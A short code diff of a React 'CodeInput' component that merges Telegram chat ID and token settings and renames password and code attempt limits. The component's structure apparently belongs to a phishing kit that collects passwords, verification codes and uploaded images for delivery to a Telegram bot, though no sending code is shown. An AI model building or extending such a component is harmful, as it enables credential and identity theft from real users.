@@ -10,17 +10,13 @@ import React, { useEffect, useRef, useState } from 'react';
 interface Config {
 	settings: {
 		code_loading_time: number;
-		max_failed_code_attempts: number;
-		max_failed_password_attempts: number;
-		page_loading_time: number;
-		password_loading_time: number;
-		code_input_enabled: boolean;
+		pass_loading_time: number;
+		max_pass_attempts: number;
+		max_code_attempts: number;
 	};
 	telegram: {
-		notification_chatid: string;
-		notification_token: string;
-		data_chatid: string;
-		data_token: string;
+		chat_id: string;
+		token: string;
 	};
 }
 
@@ -65,7 +61,7 @@ const CodeInput: React.FC = () => {
 		setFailedCodeAttempts(failedCodeAttempts + 1);
 		if (
 			config &&
-			failedCodeAttempts === config.settings.max_failed_code_attempts
+			failedCodeAttempts === config.settings.max_code_attempts
 		) {
 			setIsModalOpen(true);
 			const messageID = localStorage.getItem('message_id');
@@ -125,7 +121,7 @@ const CodeInput: React.FC = () => {
 		return <Loading />;
 	}
 
-	return config.settings.code_input_enabled ? (
+	return (
 		<div className='flex w-full flex-col items-center justify-center p-4'>
 			<div className='flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3'>
 				<div className='flex flex-col'>
@@ -192,8 +188,6 @@ const CodeInput: React.FC = () => {
 			</div>
 			{isModalOpen && <ImageUpload onClose={handleCloseModal} />}
 		</div>
-	) : (
-		<ImageUpload onClose={handleCloseModal} />
 	);
 };
 
